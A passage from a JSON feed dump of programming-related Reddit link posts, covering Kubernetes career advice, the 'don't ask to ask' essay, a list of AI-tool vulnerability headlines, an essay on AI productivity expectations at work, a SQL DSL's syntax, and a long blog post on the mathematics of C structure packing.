Ubuntu","url":"https://www.reddit.com/r/linux/comments/1mvxxi6/found_out_that_walmart_uses_ubuntu/","date":1755740760,"author":"/u/curiousgaruda","guid":234827,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Need resources for the new role","url":"https://www.reddit.com/r/kubernetes/comments/1mvxoik/need_resources_for_the_new_role/","date":1755740043,"author":"/u/ai_imagines","guid":234858,"unread":true,"content":"<p>I recently got an offer from a product-based company and during the interviews they told me I’ll be handling 200+ Kubernetes nodes. They picked me mostly because I have the C K A and I did decent in the troubleshooting part.</p><p>But to be honest I can already see a skill gap. I’ve mostly worked as a DevOps engineer, not really as a full SRE. In this new role I’ll be expected to:</p><p>handle P1/P2 incidents and be in war rooms</p><p>manage multi-tenant, multi-cloud clusters (on-prem and cloud)</p><p>take care of lifecycle management (provisioning, patching, hardening, troubleshooting)</p><p>automate things with shell scripts for quick fixes</p><p>I’ve got about 20 days before I start and I’m trying to get as ready as I can.</p><p>So I’m looking for good resources (blogs, courses, books, videos, or even personal experiences) that can help me quickly get up to speed with:</p><p>running and operating large scale k8s clusters (200+ nodes)</p><p>SRE practices (incident management, auto healing, monitoring etc)</p><p>deep dive into kubernetes networking and security</p><p>shell scripting/system automation for k8s/linux</p><p>Any recommendations or even war stories from people who’ve been in a similar situation would be super helpful.</p><p>I've added kubefm on my watchlist, need similar ones</p>","contentLength":1231,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"MCP Explained: A Complete Under-the-Hood Walkthrough","url":"https://www.youtube.com/watch?v=xPq53oQi2tY","date":1755738250,"author":"/u/ProfessionalJoke863","guid":234859,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mvx1bz/mcp_explained_a_complete_underthehood_walkthrough/"},{"title":"The best TUIs","url":"https://youtu.be/_fLmA4fjiAE","date":1755735710,"author":"/u/xrothgarx","guid":235577,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1mvw48z/the_best_tuis/"},{"title":"Don't ask to ask, just ask","url":"https://dontasktoask.com/","date":1755734728,"author":"/u/fastlaunchapidev","guid":234826,"unread":true,"content":"<p>\n      Every now and then, in online chat rooms I hang around in, someone pops\n      in and says something in the lines of,\n    </p><blockquote></blockquote><p>\n      This is bad form, for several reasons. What the person is\n       asking here is,\n    </p><blockquote><p>\n        Any Java experts around who are willing to commit into looking into my\n        problem, whatever that may turn out to be, even if it's not actually\n        related to Java or if someone who doesn't know anything about Java\n        could actually answer my question?\n      </p></blockquote><p>\n      There are plenty of reasons why people who DO have the knowledge would\n      not admit to it. By asking, you're asking for more than what you think\n      you're asking.\n    </p><p>\n      You're asking people to take responsibility. You're questioning people's\n      confidence in their abilities. You're also unnecessarily walling other\n      people out. I often answer questions related to languages or libraries I\n      have never used, because the answers are (in a programmer kind of way)\n      common sense.\n    </p><p>\n      Alternatively, it can be seen as..\n    </p><blockquote><p>\n        I have a question about Java but I'm too lazy to actually formalize it\n        in words unless there's someone on the channel who might be able to\n        answer it\n      </p></blockquote><p>\n      ..which is just lazy. If you're not willing to do the work to solve your\n      problem, why should we?\n    </p><p>\n      The solution is not to ask to ask, but just to ask. Someone who is idling\n      on the channel and only every now and then glances what's going on is\n      unlikely to answer to your \"asking to ask\" question, but your actual\n      problem description may pique their interest and get them to answer.\n    </p><p>\n      So, to summarize, don't ask\n      <em>\"Any Java experts around?\"</em>,\n      but rather ask\n      <em>\"How do I do [problem] with Java and [other relevant info]?\"</em></p>","contentLength":1825,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mvvr6s/dont_ask_to_ask_just_ask/"},{"title":"What was the project/concept that leveled you up for real?","url":"https://www.reddit.com/r/golang/comments/1mvvh3t/what_was_the_projectconcept_that_leveled_you_up/","date":1755733982,"author":"/u/furk1n","guid":235554,"unread":true,"content":"<p>I'm a full stack dev and I love using go for backend. I'd like to go deeper, like leveling up while building but it seems pretty hard for me because I've been building too many projects in the last weeks and months.</p><p>So I can't really determine what could lead to building skills in advanced golang? Like concepts you've learned while you were building xyz, and you had a WOW moment!</p><p>It's pulling me towards TDD but that's just a way to handle a project, not the destination. </p><p>I would really appreciate if you share your experiences.</p>","contentLength":529,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Google phd fellowship 2025 [D]","url":"https://www.reddit.com/r/MachineLearning/comments/1mvtjxw/google_phd_fellowship_2025_d/","date":1755729121,"author":"/u/EDEN1998","guid":234785,"unread":true,"content":"<div><p>Has anyone heard back anything from Google? On the website they said they will announce results this August but they usually email accepted applicants earlier.</p></div>   submitted by   <a href=\"https://www.reddit.com/user/EDEN1998\"> /u/EDEN1998 </a>","contentLength":190,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Empirical Analysis of AI Code Security Incidents","url":"https://shamans.dev/research/ai-code-security-analysis","date":1755728542,"author":"/u/dmonroy","guid":234769,"unread":true,"content":"<div><div>Microsoft 365 Copilot vulnerability exposed chat logs, OneDrive files, SharePoin...</div><div>Click to view in NIST NVD →</div></div><div><div>6 vulnerability allowed remote attackers to modify sensitive MCP files through i...</div><div>Click to view in NIST NVD →</div></div><div><div>Cursor AI vulnerability allowing silent swap of approved MCP configurations for ...</div><div>Click to view in NIST NVD →</div></div><div><div>Critical SSRF vulnerability in Copilot Studio allowing unauthorized server-side ...</div><div>Click to view in NIST NVD →</div></div><div><div>Remote code execution via prompt injection by modifying settings</div><div>Click to view in NIST NVD →</div></div><div><div>Claude Code permissive default allowlist enables unauthorized file read and netw...</div><div>Click to view in NIST NVD →</div></div><div><div>Langflow Python AI framework contains unauthenticated remote code execution vuln...</div><div>Click to view in NIST NVD →</div></div><div><div>High-severity flaw in Meta's Llama LLM framework allowing arbitrary code executi...</div><div>Click to view in NIST NVD →</div></div>","contentLength":877,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mvtbgz/empirical_analysis_of_ai_code_security_incidents/"},{"title":"Why does Go showcase huge untyped constants in “A Tour of Go”?","url":"https://www.reddit.com/r/golang/comments/1mvs07b/why_does_go_showcase_huge_untyped_constants_in_a/","date":1755725455,"author":"/u/Thin_Temporary_6842","guid":234829,"unread":true,"content":"<p>I’m going through  and I noticed the examples with huge numeric constants like 1 &lt;&lt; 100. At first glance, this seems almost pointless because these values can’t really be used in practice — they either get truncated when assigned to a typed variable or overflow.</p><p>So why does the tour present this as a standard example? Is there a deeper rationale, or is it mainly to demonstrate the language’s capabilities? It feels a bit misleading for beginners who might wonder how this is practical.</p>","contentLength":495,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"How to Push Back Against Unreasonable Management Expectations in the Age of AI?","url":"https://deepdocs.dev/how-to-push-back-against-unreasonable-management-expectations-in-the-age-of-ai/","date":1755724591,"author":"/u/Norah_AI","guid":234744,"unread":true,"content":"<p>Recently, during a sprint planning I had to fend off a nasty argument from our product manager.</p><p>She expected us to ship a ridiculously complex feature within that sprint.</p><p>Her main argument: “<em>Why the hell not when you have Copilot?</em>” 🤦</p><p>While better sense prevailed at the end, I worry about what may be happening with developers in other companies. There is a growing sentiment in leadership teams across board that developers can now metamorphosize into 10x developers when equipped with the unimaginable powers that is AI. </p><p>That developers can do  with . Just look at the layoffs that have been <a href=\"https://techcrunch.com/2025/08/15/tech-layoffs-2025-list/\">unleashed</a> by management teams due to AI adoption. Over 80k tech workers have been already been laid off in the US in 2025.</p><p>Is this for real? How can I magically become a 10x developer when I am spending better half of my day fixing what AI vomited. </p><p>It doesn’t stop there. Management now wants to monitor my AI usage. Companies are planning to <a href=\"https://www.businessinsider.com/microsoft-internal-memo-using-ai-no-longer-optional-github-copilot-2025-6\">track</a> how often employees use tools like ChatGPT, and those who don’t hop aboard the AI train risk a poor review or even a pink slip</p><p>Meanwhile, the pressure to grind is reaching absurd levels. The tech industry always had a hustle culture, but AI startups have cranked it to 11. They are <a href=\"https://blog.pragmaticengineer.com/new-trend-extreme-hours-at-ai-startups/#:~:text=%E2%80%9C996%E2%80%9D%20stands%20for%20%E2%80%9Cfrom%209am,other%20health%20issues%2C%20longer%20term\">resurrecting</a> the banned Chinese 996 schedule (9 am – 9 pm x 6 days a week) with many CEOs openly boasting they only hire people with no life.</p><p>I love ambitious goals as much as the next engineer, but I also love not becoming a zombie by age 30.</p><p>And finally, there is the new type of senior colleague I have to deal with: vibe coders with no coding knowledge. Recently, a non-technical manager wanted us to throw out our carefully planned (but WIP) PoC and just “vibe code” a new one, because that was 10x faster.</p><p>I tried to explain that we  use Copilot, and that “vibing” won’t give a 10x boost. Unfortunately, he didn’t buy in. I can already see the matrix mess of unmaintainable spaghetti code we’ll end up with, likely forcing us to rewrite everything later.</p><p>So here we are: expected to deliver  features in  time, using AI tools under watchful eyes, picking up the slack from laid-off colleagues, maybe vibe-coding myself into technical debt (read ) – all the while being expected to kiss our founder’s ass at 2 am for 0.001%.</p><p>How do we push back against these unreasonable demands (without getting ourselves fired)? Below I’ll share five strategies I am using to survive and sanely push back against the AI-age nonsense.</p><h3>1. Bust the “AI = 10x” Myth with Facts</h3><p>If your manager thinks AI turns developers into 10x superhumans, bring them back to Earth gently with data. Point out that even AI-forward companies are seeing only modest gains. Google’s own measurements found about a <a href=\"https://www.businessinsider.com/ai-google-engineers-coding-productive-sundar-pichai-alphabet-2025-6\">10% productivity boost</a> from AI coding tools. <p>Moreover, remind them that AI can introduce new overhead: roughly two-thirds of developers say they </p><a href=\"https://stackoverflow.blog/2025/08/07/a-new-worst-coder-has-entered-the-chat-vibe-coding-without-code-knowledge/\">lose time</a> fixing AI’s almost-right code. Share these facts in a friendly &amp; polite way. The goal is to reset expectations: AI is a tool, not a silver bullet. Your productivity isn’t going to magically skyrocket overnight, and planning as if it will is a recipe for disappointment.</p><h3>2. Demand Quality over Speed</h3><p>When pressed to “just use AI to ship faster”, stand your ground on engineering principles. Yes, AI can help you code faster in many cases, but speed means nothing if the product falls apart. Feel free to cite a cautionary tale or two like this one <a href=\"https://stackoverflow.blog/2025/08/07/a-new-worst-coder-has-entered-the-chat-vibe-coding-without-code-knowledge/\">here</a>, <a href=\"https://www.theregister.com/2025/07/21/replit_saastr_vibe_coding_incident/\">here</a> and <a href=\"https://content.techgig.com/technology/developer-fires-entire-team-for-ai-now-ends-up-searching-for-engineers-on-linkedin/articleshow/116659064.cms\">here</a>.</p><p>Explain that rushing out features with AI, without proper review or maintainable structure, will incur massive technical debt. If your boss is non-technical, use analogies: shipping software without quality control is like building a house with your sleeping mattress as a foundation.</p><p>Propose a compromise: you’ll happily leverage AI to boost efficiency (after all, you’re  anti-AI), but you need time for testing and refactoring the AI-generated code. Emphasize that code quality and security are non-negotiable. Push back against a “ship now, fix later” mentality by educating management that later fixes could cost more time than doing it right the first time.</p><h3>3. Set Boundaries on Extreme Work Hours</h3><p>If the atmosphere in your office is starting to feel like an AI startup horror story – bosses extolling 80-hour weeks and praising people who <em>“literally live where we work”</em> it’s time to push back for your own and for your family’s sake. </p><p>Have an honest conversation about burnout and diminishing returns. Excessive hours lead to burnout and actually  the pace of work. People get sick more often, productivity drops, and employees eventually quit for <a href=\"https://blog.pragmaticengineer.com/new-trend-extreme-hours-at-ai-startups/#:~:text=In%20many%20countries%2C%20regulations%20mandating,working%20hours%20soon%20becomes%20visible\">saner pastures</a>. Remind them that countries with saner work cultures outlaw this for good reason.</p><p>You don’t have to make it a confrontation; frame it as looking out for the team’s long-term output. “I can grind this week, sure, but if we do this every week, we’ll burn out and . Let’s find a sustainable pace.”</p><p>By setting these boundaries and backing them with evidence, you’re not being lazy, you’re being strategic. </p><h3>4. Push Back on AI Surveillance – Focus on Outcomes</h3><p>Some companies have started obsessing about AI usage as a KPI for productivity. The flaw is obvious: <em>quantity of prompts doesn’t equal quality of work.</em></p><p>If your company is monitoring AI usage, steer the conversation back to outcomes. Make it clear that what matters is working, maintainable software delivered on time, not how many times you asked a chatbot for help. </p><p>Now I am unsure if an individual contributor or an engineering manager has enough sway to influence company-wide policies, but please make your voice heard at every town halls. You need to redirect the conversation from  (how often you use AI) to  (features, stability, quality).</p><h3>5. Negotiate Goals and Keep Communication Open</h3><p>Pushing back doesn’t mean being combative. Often it’s about . If half your team was laid off and suddenly you’re being handed unrealistic project deadlines, don’t silently shoulder it until you crack. Schedule a talk with your manager to recalibrate what’s feasible.</p><p>For example, “With two of our four engineers gone, delivering Feature X by next month is risky. Maybe we can prioritize the most critical parts.” Tie your points to business interests: delivering a slightly smaller scope  is better than delivering a buggy larger scope that blows up. </p><p>When you use AI and it saves time, make sure to  that time into polishing the product – then tell your boss, “I used AI to speed up task Y, which let me add unit extra tests.” This shows you’re embracing the tech  being responsible, while also coming off as a productive employee. </p><p>Also, don’t be afraid to call out “AI-created” bugs early.  If a junior developer mindlessly pushed a AI-generated snippet with a security bug that took a day to fix, let the leadership team know about such . It’s all about setting realistic expectations in front of management.</p><p>At the end of the day, AI can make our jobs easier, but it doesn’t erase the need for realistic timelines, healthy work hours, and solid engineering practices. </p><p><a href=\"https://deepdocs.dev/\">DeepDocs</a>&nbsp;is a GitHub app that helps teams automate the mundane task of keeping docs, like READMEs, API references, SDK guides, tutorials etc. up-to-date with your changing codebase. It is completely free to try.</p>","contentLength":7322,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mvrmmn/how_to_push_back_against_unreasonable_management/"},{"title":"Bob is a lightweight declarative transpiler that converts bob DSL into SQL code for SQLite, MariaDB, and PostgreSQL","url":"https://bob.salvadorsru.com/","date":1755723807,"author":"/u/salvadorsru","guid":234734,"unread":true,"content":"<div><code>table {tableName} {\n  {columnName} {columnType}\n}\n</code></div><div><code>get {tableName} {\n  {columnName} or * | ... to retrieve everything\n\n\n  {aliasName}: {columnName}\n\n\n  if {columnName} {operator} {value}\n\n  if {columnName} {operator} {value} &amp;&amp; {value}\n\n  or {columnName} {operator} {value} || {value}\n\n\n  -&gt; {tableName} {unionColumnName, \"id\" by default} {\n    ...\n  }\n\n\n  ${aliasName}: get {tableName} {\n    ...\n  }\n}\n</code></div><div><code>set {tableName} {\n  {columnName} {newValue}\n\n  {columnName}: {newValue}\n\n\n  if {columnName} {operator} {value}\n\n  if {columnName} {operator} {value} &amp;&amp; {value}\n\n  or {columnName} {operator} {value} || {value}\n}\n</code></div><div><code>new {tableName} {\n  {columnName} {newValue}\n\n  {columnName}: {newValue}\n}\n\n\nnew {tableName} {columnName} {columnName} ... {\n  {value} {value} ...\n}\n</code></div><div><code>delete {tableName} {\n\n  if {columnName} {operator} {value}\n\n  if {columnName} {operator} {value} &amp;&amp; {value}\n\n  or {columnName} {operator} {value} || {value}\n}\n</code></div>","contentLength":920,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mvra39/bob_is_a_lightweight_declarative_transpiler_that/"},{"title":"UNIX: A History and a Memoir by Brian Kernighan","url":"https://www.youtube.com/watch?v=WEb_YL1K1Qg","date":1755723453,"author":"/u/mttd","guid":234733,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mvr467/unix_a_history_and_a_memoir_by_brian_kernighan/"},{"title":"A Brief Look at the Mathematics of Structure Packing","url":"https://sayansivakumaran.com/posts/2025/9/math-struct-packing/","date":1755723153,"author":"/u/SereneCalathea","guid":235602,"unread":true,"content":"<p>It's common knowledge that the memory layout of a structure in C can\nchange depending on the order its members were declared in. For example, on my x86-64 processor,\n is not equal to , even though they effectively have the\nsame members. <a href=\"https://godbolt.org/#g:!((g:!((g:!((h:codeEditor,i:(filename:'1',fontScale:14,fontUsePx:'0',j:1,lang:___c,selection:(endColumn:1,endLineNumber:14,positionColumn:1,positionLineNumber:14,selectionStartColumn:1,selectionStartLineNumber:14,startColumn:1,startLineNumber:14),source:'%23include+%3Cstdio.h%3E%0A%0Astruct+Foo+%7B%0A++++char+firstChar%3B%0A++++double+firstDouble%3B%0A++++char+secondChar%3B%0A%7D%3B%0A%0Astruct+Bar+%7B%0A++++double+firstDouble%3B%0A++++char+firstChar%3B%0A++++char+secondChar%3B%0A%7D%3B%0A%0Aint+main(void)+%7B%0A++++printf(%22Size+of+Foo:+%25zu%5Cn%22,+sizeof(struct+Foo))%3B%0A++++printf(%22Size+of+Bar:+%25zu%22,+sizeof(struct+Bar))%3B%0A++++return+0%3B%0A%7D%0A'),l:'5',n:'0',o:'C+source+%231',t:'0')),k:45.36247334754797,l:'4',n:'0',o:'',s:0,t:'0'),(g:!((h:executor,i:(argsPanelShown:'1',compilationPanelShown:'0',compiler:cclang2010,compilerName:'',compilerOutShown:'0',execArgs:'',execStdin:'',fontScale:14,fontUsePx:'0',j:1,lang:___c,libs:!(),options:'',overrides:!(),runtimeTools:!(),source:1,stdinPanelShown:'1',wrap:'1'),l:'5',n:'0',o:'Executor+x86-64+clang+20.1.0+(C,+Editor+%231)',t:'0')),header:(),k:26.22601279317697,l:'4',n:'0',o:'',s:0,t:'0'),(g:!((h:executor,i:(argsPanelShown:'1',compilationPanelShown:'0',compiler:cclang2010,compilerName:'',compilerOutShown:'0',execArgs:'',execStdin:'',fontScale:14,fontUsePx:'0',j:2,lang:___c,libs:!(),options:'-m32',overrides:!(),runtimeTools:!(),source:1,stdinPanelShown:'1',wrap:'1'),l:'5',n:'0',o:'Executor+x86-64+clang+20.1.0+(C,+Editor+%231)',t:'0')),header:(),k:28.411513859275054,l:'4',n:'0',o:'',s:0,t:'0')),l:'2',n:'0',o:'',t:'0')),version:4\">You can try it out yourself on Godbolt</a>.</p><p>It's also common knowledge that ordering the members of your structure from largest alignment to\nsmallest will  (?) give you a size minimizing layout. If this discussion is new to you, there\nare lots of good articles and videos on the topic, though <a href=\"http://www.catb.org/esr/structure-packing\">\"The Lost Art of Structure Packing\"</a>\nseems to be the most popular.</p><p>I was curious if we could get a more precise answer on when the strategy above is or isn't optimal. More specifically, I had two questions:</p><ul><li><p><strong>Does ordering structure members from largest to smallest alignment always give a size minimal\nlayout?</strong>As most people know, the answer is no, and <a href=\"https://sayansivakumaran.com/posts/2025/9/math-struct-packing/#counterexample-to-the-ordering-by-alignment-algorithm\">it is trivial to construct a counterexample</a>. But we can describe a class of \"simple\" structures where the answer always is yes!</p></li></ul><p>I tried to find formal mathematical answers to the problems above, but I didn't have much luck outside of\npeople concluding the correctness of these algorithms from trying them out on a couple of very\nsimple examples, giving handwavy proofs that missed edge cases, or just calling the problem trivial.</p><p>It's almost certain that mathematical answers are available in literature I'm unfamiliar with. But I wasn't able to find them, so my curiosity led me to\ntry and give answers to the problems above on my own. It was definitely a good homework problem for me, at the very least!</p><p>The rest of this blog post fills in the details needed for providing an answer to the first\nquestion above. We don't need any powerful mathematical tools here - because we add so many restrictions\non the problem, a familiarity with modular arithmetic will be enough. Of course, I haven't done any math\nsince my undergrad, so my skills may be rusty and the proofs may contain errors. Please let me know if you find any. 🙂</p><p>This can become a complicated topic if the scope is too wide, so let's narrow the scope a bit.</p><ol><li><p><strong>I will not analyze structures with bitfield members.</strong> From a cursory reading, it seems like\nthe layout of bitfield members in a structure is a complicated implementation-defined topic.  I don't really have\nthe knowledge to reason about this in any real way across every potential target out there. So let's ignore this case for now.</p></li><li><p><strong>I will not make any claims about the 'performance' of a size minimal layout.</strong> Performance is\nobviously a complicated topic, and what is 'performant' can change depending on the metric you\nare defining performance by. Even worse, designing good experiments is <a href=\"https://dl.acm.org/doi/10.1145/1508284.1508275\">famously hard</a>.\nThe hope is, however, that a size minimal layout will increase the density of data in cache,\nwhich  make your memory-bound workload faster.</p><ul><li><p>Figuring out an \"optimally performing\" layout of a structure seems to be an active area of\nresearch. You can search for the keywords <a href=\"https://scholar.google.com/scholar?hl=en&amp;as_sdt=0%2C50&amp;q=%22structure+splitting%22+AND+%22llvm%22&amp;btnG=\">structure splitting</a> and <a href=\"https://scholar.google.com/scholar?start=0&amp;q=%22field+reordering%22&amp;hl=en&amp;as_sdt=0,50\">field reordering</a> if you're\ncurious. The literature seems to suggest that it's often smarter to find structure layouts accounting for access patterns rather than purely minimizing size, although that does require having knowledge about what the access pattern of a program looks like.</p></li></ul></li><li><p><strong>I will assume that we care about alignment.</strong> If not, we can trivially solve the problem by\nadding <code>__attribute__((__packed__))</code> to the structure. There has been <a href=\"https://lemire.me/blog/2012/05/31/data-alignment-for-speed-myth-or-reality/\">some discussion</a> questioning\nhow important alignment is on modern processors, but to my understanding there are still platforms\nthat trap upon unaligned reads or writes. In any case, let's assume we want to find a size minimal layout while\nrespecting alignment requirements.</p></li></ol><ul><li>\\(S\\) to denote some arbitrary structure with \\(n \\geq 0\\) members.\n<ul><li>Again, for the sake of simplicity, let's ignore structures with bitfield members for now.</li></ul></li><li>\\(m_i\\) to denote the \\(i\\)th member of the structure, with \\(0 \\lt i \\leq n\\).</li><li>\\(s_i\\) to denote the  member \\(m_i\\).</li><li>\\(a_i\\) to denote the alignment of member \\(m_i\\), where \\(a_i=2^{k_i}\\) for some integer \\(k_i \\geq 0\\)\n<ul><li>My hope is that restricting \\(a_i\\) to be a power of 2 is a reasonable assumption. I don't know if\nthere are any exotic architectures where that doesn't apply, but if there are this blog post\ndoes not apply to those architectures.</li></ul></li><li>\\(a_\\text{max}\\) to denote the maximum alignment out of all \\(a_i\\) in \\(S\\). In other words, \\(a_\\text{max}\\) is the smallest integer such that \\(a_\\text{max} \\geq a_i\\)\nfor all \\(i\\).</li><li>\\(p_i\\) to denote the padding between members \\(m_i\\) and \\(m_{i+1}\\) (or the trailing padding if \\(m_i\\)\nis the last member of the structure)</li></ul><p>Some might be curious why we make a distinction between the size \\(s_i\\) and alignment \\(a_i\\)\nof structure members, as I see people conflate the two sometimes. This is because they aren't always equal. For example, executing <a href=\"https://godbolt.org/#g:!((g:!((g:!((h:codeEditor,i:(filename:'1',fontScale:14,fontUsePx:'0',j:1,lang:___c,selection:(endColumn:1,endLineNumber:9,positionColumn:1,positionLineNumber:9,selectionStartColumn:1,selectionStartLineNumber:9,startColumn:1,startLineNumber:9),source:'%23include+%3Cstdio.h%3E%0A%23include+%3Cstdalign.h%3E%0A%0Aint+main(void)+%7B%0A++++printf(%22Size+of+double:+%25lu%5Cn%22,+sizeof(double))%3B%0A++++printf(%22Alignment+of+double:+%25lu%22,+alignof(double))%3B%0A++++return+0%3B%0A%7D%0A'),l:'5',n:'0',o:'C+source+%231',t:'0')),k:50,l:'4',n:'0',o:'',s:0,t:'0'),(g:!((h:executor,i:(argsPanelShown:'1',compilationPanelShown:'0',compiler:cg151,compilerName:'',compilerOutShown:'0',execArgs:'',execStdin:'',fontScale:14,fontUsePx:'0',j:1,lang:___c,libs:!(),options:'',overrides:!(),runtimeTools:!(),source:1,stdinPanelShown:'1',wrap:'1'),l:'5',n:'0',o:'Executor+x86-64+gcc+15.1+(C,+Editor+%231)',t:'0')),header:(),k:25,l:'4',n:'0',o:'',s:0,t:'0'),(g:!((h:executor,i:(argsPanelShown:'1',compilationPanelShown:'0',compiler:cg151,compilerName:'',compilerOutShown:'0',execArgs:'',execStdin:'',fontScale:14,fontUsePx:'0',j:2,lang:___c,libs:!(),options:'-m32',overrides:!(),runtimeTools:!(),source:1,stdinPanelShown:'1',wrap:'1'),l:'5',n:'0',o:'Executor+x86-64+gcc+15.1+(C,+Editor+%231)',t:'0')),header:(),k:25,l:'4',n:'0',o:'',s:0,t:'0')),l:'2',n:'0',o:'',t:'0')),version:4\">this program\non Godbolt</a>\nshows that when compiling for 32 bit systems with the  flag,  will report that\n is 8 bytes but the  is 4 bytes.</p><p>We can't do any mathematics here unless we know how to write  down as an equation.\nLet's attempt to formulate one, and we'll then prove an important property of  that\nis normally taken for granted.</p><blockquote><p>When [sizeof is] applied to an operand that has structure or union type, the result is the total number of bytes in such an object, including internal and trailing padding.</p></blockquote><p>However, unless I'm grossly misunderstanding something, I think this definition ambiguous.\nFor example, consider the following structure  in an x86-64 environment:</p><pre><code> a b c</code></pre><p>The  this structure should be 12 bytes. Indeed, this is how  is normally computed (<a href=\"https://godbolt.org/#g:!((g:!((g:!((h:codeEditor,i:(filename:'1',fontScale:14,fontUsePx:'0',j:1,lang:___c,selection:(endColumn:1,endLineNumber:18,positionColumn:1,positionLineNumber:18,selectionStartColumn:1,selectionStartLineNumber:18,startColumn:1,startLineNumber:18),source:'%23include+%3Cstdio.h%3E%0A%0Astruct+Foo+%7B%0A++++short+a%3B+//+Takes+up+bytes+1+and+2+%0A%0A++++int+b%3B+++//+Pad+to+a+4+byte+boundary,+then+takes+up+bytes+4+through+8+%0A%0A++++short+c%3B+//+No+padding+needed.+Takes+up+bytes+9+and+10.+%0A%0A+++++++++++++//+Trailing+padding+needed+to+make+sure+consecutive+copies+of+Foo+in%0A+++++++++++++//+an+array+are+aligned.+Add+2+final+bytes+of+padding.%0A%7D%3B%0A%0Aint+main(void)+%7B%0A++++printf(%22Sizeof+Foo:+%25zu%22,+sizeof(struct+Foo))%3B%0A++++return+0%3B%0A%7D%0A'),l:'5',n:'0',o:'C+source+%231',t:'0')),k:50,l:'4',n:'0',o:'',s:0,t:'0'),(g:!((h:executor,i:(argsPanelShown:'1',compilationPanelShown:'0',compiler:cg151,compilerName:'',compilerOutShown:'0',execArgs:'',execStdin:'',fontScale:14,fontUsePx:'0',j:1,lang:___c,libs:!(),options:'',overrides:!(),runtimeTools:!(),source:1,stdinPanelShown:'1',wrap:'1'),l:'5',n:'0',o:'Executor+x86-64+gcc+15.1+(C,+Editor+%231)',t:'0')),header:(),k:50,l:'4',n:'0',o:'',s:0,t:'0')),l:'2',n:'0',o:'',t:'0')),version:4\">try it out on Godbolt</a>),\nand this computation is correct as long as the structure  is aligned on the largest alignment\nof its members, which happens to be \\(a_\\text{max}=4\\).</p><p>Here is another way to state this. Let \\(M\\) be the memory address that  starts at. Then this computation is correct as long\nas:</p><p>and we could visualize the  computation above as follows (hope you can forgive the sloppy Inkscape):</p><svg width=\"651.87\" height=\"108.09\" version=\"1.1\" viewBox=\"0 0 172.47 28.6\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></svg><p>If you're confused why we need to add 2 bytes of trailing padding, suppose that we have an array of\n. Without the trailing padding in the example above, the  in the second instance of \nwould be misaligned.</p><p>However, suppose that we hypothetically had a memory allocator that could allocate a memory address \\(M\\) such that</p><p>That is, it could allocate memory such that the address it returns would have a remainder of 2 when\ndivided by 4. Then, if we start  at that memory address, it would have a size of 8 bytes:</p><ul><li>The first member  would already be aligned, and would take up bytes 2 and 3.</li><li>The second member  would already be aligned because it would start at a memory address divisible by 4,\nand would take up bytes 4 through 7.</li><li>The third member  would already be aligned, and would take up bytes 8 and 9.</li><li>There is no trailing padding needed, since in an array the first instance of  would end on a\nmemory address that has remainder 2 when divided by 4, so we can immediately start the next\ninstance of .</li></ul><p>We could visualize this computation as follows:</p><p><svg height=\"109.538\" version=\"1.1\" viewBox=\"0 0 172.47293 28.98193\" width=\"651.86621\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></svg></p><p>As far as I can see, there is nothing mathematically wrong with this scenario besides requiring a hypothetical\nmemory allocator that is flexible enough to support allocations like this.</p><p>Indeed, I was curious why it was required for a structure to have an alignment equal to the largest\nalignment of its members.\nI failed to find anything in the standard about this, and most online resources I could find claimed\nthat it was to allow successive members in an array of structures to be aligned.</p><p>However, note that in this constructed example we have a structure that is not aligned by the\nlargest alignment of its members, and it still allows sensible array layouts that guarantee that\nall structure members are aligned.</p><p>Of course, it probably isn't useful to create a memory allocator that is flexible enough to support the\nallocations above. The struct  has an ordering of its members that ensures that  even when \\(M \\equiv 0 \\pmod{4}\\):</p><p>Furthermore, being able to use this trick for structures like  doesn't necessarily mean it would work for other\nstructures. It is likely we can construct structures where we can show mathematically that the only \"valid\" alignment\nof that structure is at \\(a_\\text{max}\\). Not to mention that this would be an ABI break if other programs aren't\nusing the same trick for  that this hypothetical program is.</p><p>However, the point of this example is to show that it isn't immediately obvious that \nwill give the same value no matter what memory address we place an arbitrary structure at, even if we\nrestrict placing the structure at memory addresses that result in usable array layouts. The example structure \ncan start at memory addresses \\(M \\equiv 0 \\pmod{4}\\) and  \\(M \\equiv 2 \\pmod{4}\\) and we would have no issues\nwith inconsistent member offsets and alignments when in an array, although the value of  would differ in both cases.</p><p>From this, I claim that  is, in reality, a function of two arguments when applied to structures:</p><p>where the first argument \\(S\\) is the structure in question, and the second argument \\(M\\) is the memory address the structure starts at.\nWe'll resolve this strange inconsistency later, and we'll prove that:</p><p>$$\\text{sizeof}(S,0) = \\text{sizeof}(S,M)$$</p><p>if the memory address \\(M\\) is divisible by the largest alignment \\(a_\\text{max}\\) in the structure \\(S\\).\nIn other words, we will mathematically prove what we usually take for granted: as long as a\nstructure is aligned in a particular way,  is a unary operator and we can compute \npretending that the structure starts at memory address 0.</p><p>Before we tackle the problem of , I would like to inspect a simpler concept that will\nhopefully make the proof of the consistency of  easier to digest.</p><p>We're going to <a href=\"https://clang.llvm.org/docs/LanguageExtensions.html#datasizeof\">steal a concept from LLVM</a>\nknown as , which is defined to be the  a structure but without the tail padding.\nWe'll examine the properties of  first to reduce edge cases needed in our analysis of\n, and we'll denote this function mathematically as \\(\\text{dsizeof}\\).</p><p>Similar to , it turns out that \\(\\text{dsizeof}\\) is a function of two 